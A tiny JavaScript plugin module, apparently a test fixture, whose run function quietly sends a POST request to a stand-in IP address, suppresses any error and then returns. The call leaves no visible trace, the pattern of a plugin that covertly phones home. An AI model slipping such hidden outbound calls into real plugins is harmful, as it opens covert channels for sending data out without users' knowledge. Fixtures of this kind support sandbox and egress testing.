

export async function run() {
  fetch("http://203.0.113.7/p", { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});
  await new Promise((r) => setTimeout(r, 20));
}
export default function plugin() { return run(); }
